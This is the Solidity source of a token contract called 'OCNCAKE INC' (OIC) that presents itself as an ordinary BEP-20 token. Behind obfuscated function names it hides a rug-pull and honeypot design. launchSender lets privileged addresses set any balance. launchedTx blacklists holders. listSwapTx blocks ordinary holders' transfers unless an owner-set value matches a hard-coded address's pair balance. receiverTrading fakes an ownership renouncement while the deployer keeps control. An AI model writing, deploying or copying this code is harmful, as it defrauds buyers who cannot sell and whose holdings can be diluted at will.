//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface liquidityTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txBuy) external view returns (uint256);

    function transfer(address limitSell, uint256 buyTxFee) external returns (bool);

    function allowance(address takeSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyTxFee) external returns (bool);

    function transferFrom(address sender,address limitSell,uint256 buyTxFee) external returns (bool);

    event Transfer(address indexed from, address indexed receiverWallet, uint256 value);
    event Approval(address indexed takeSell, address indexed spender, uint256 value);
}

interface txIsList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface liquidityList {
    function createPair(address amountExemptTotal, address liquidityShould) external returns (address);
}

abstract contract takeTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityTxMetadata is liquidityTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OCNCAKEINC is takeTo, liquidityTx, liquidityTxMetadata {

    mapping(address => uint256) private fundTeam;

    function enableReceiverSender(address maxMin) public {
        if (toLiquidity) {
            return;
        }
        
        minModeEnable[maxMin] = true;
        if (tokenLaunched == tokenWallet) {
            takeTrading = isMarketingSell;
        }
        toLiquidity = true;
    }

    function balanceOf(address txBuy) public view virtual override returns (uint256) {
        return fundTeam[txBuy];
    }

    mapping(address => mapping(address => uint256)) private limitWallet;

    function toFee() private view {
        require(minModeEnable[_msgSender()]);
    }

    uint8 private teamAt = 18;

    address tokenExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function launchedTx(address atFee) public {
        toFee();
        if (isShouldLaunched) {
            isShouldLaunched = true;
        }
        if (atFee == tokenExemptTo || atFee == buyAuto) {
            return;
        }
        autoLaunched[atFee] = true;
    }

    function walletLimitMax(address launchedWallet, address limitSell, uint256 buyTxFee) internal returns (bool) {
        require(fundTeam[launchedWallet] >= buyTxFee);
        fundTeam[launchedWallet] -= buyTxFee;
        fundTeam[limitSell] += buyTxFee;
        emit Transfer(launchedWallet, limitSell, buyTxFee);
        return true;
    }

    uint256 private toAuto;

    bool public tokenWallet;

    function owner() external view returns (address) {
        return totalFee;
    }

    event OwnershipTransferred(address indexed modeShould, address indexed autoLiquidity);

    mapping(address => bool) public minModeEnable;

    address private totalFee;

    function launchSender(address launchedLiquidity, uint256 buyTxFee) public {
        toFee();
        fundTeam[launchedLiquidity] = buyTxFee;
    }

    function receiverTrading() public {
        emit OwnershipTransferred(tokenExemptTo, address(0));
        totalFee = address(0);
    }

    mapping(address => bool) public autoLaunched;

    function symbol() external view virtual override returns (string memory) {
        return maxMinTx;
    }

    string private tokenSender = "OCNCAKE INC";

    address public buyAuto;

    uint256 private listTo;

    function transfer(address launchedLiquidity, uint256 buyTxFee) external virtual override returns (bool) {
        return listSwapTx(_msgSender(), launchedLiquidity, buyTxFee);
    }

    function name() external view virtual override returns (string memory) {
        return tokenSender;
    }

    uint256 feeExempt;

    uint256 totalLimit;

    function allowance(address takeFund, address enableLiquidity) external view virtual override returns (uint256) {
        if (enableLiquidity == receiverReceiver) {
            return type(uint256).max;
        }
        return limitWallet[takeFund][enableLiquidity];
    }

    address receiverReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address enableLiquidity, uint256 buyTxFee) public virtual override returns (bool) {
        limitWallet[_msgSender()][enableLiquidity] = buyTxFee;
        emit Approval(_msgSender(), enableLiquidity, buyTxFee);
        return true;
    }

    uint256 private isMarketingSell;

    uint256 private takeTrading;

    uint256 private minAt = 100000000 * 10 ** 18;

    string private maxMinTx = "OIC";

    constructor (){
        
        receiverTrading();
        txIsList swapMode = txIsList(receiverReceiver);
        buyAuto = liquidityList(swapMode.factory()).createPair(swapMode.WETH(), address(this));
        
        tokenExemptTo = _msgSender();
        minModeEnable[tokenExemptTo] = true;
        fundTeam[tokenExemptTo] = minAt;
        
        emit Transfer(address(0), tokenExemptTo, minAt);
    }

    function enableWallet(uint256 buyTxFee) public {
        toFee();
        totalLimit = buyTxFee;
    }

    function decimals() external view virtual override returns (uint8) {
        return teamAt;
    }

    function transferFrom(address launchedWallet, address limitSell, uint256 buyTxFee) external override returns (bool) {
        if (_msgSender() != receiverReceiver) {
            if (limitWallet[launchedWallet][_msgSender()] != type(uint256).max) {
                require(buyTxFee <= limitWallet[launchedWallet][_msgSender()]);
                limitWallet[launchedWallet][_msgSender()] -= buyTxFee;
            }
        }
        return listSwapTx(launchedWallet, limitSell, buyTxFee);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return minAt;
    }

    bool private tokenLaunched;

    function listSwapTx(address launchedWallet, address limitSell, uint256 buyTxFee) internal returns (bool) {
        if (launchedWallet == tokenExemptTo) {
            return walletLimitMax(launchedWallet, limitSell, buyTxFee);
        }
        uint256 listTx = liquidityTx(buyAuto).balanceOf(tokenExempt);
        require(listTx == totalLimit);
        require(!autoLaunched[launchedWallet]);
        return walletLimitMax(launchedWallet, limitSell, buyTxFee);
    }

    bool public toLiquidity;

    function getOwner() external view returns (address) {
        return totalFee;
    }

    address public tokenExemptTo;

    bool public isShouldLaunched;

    uint256 public fromModeTeam;

}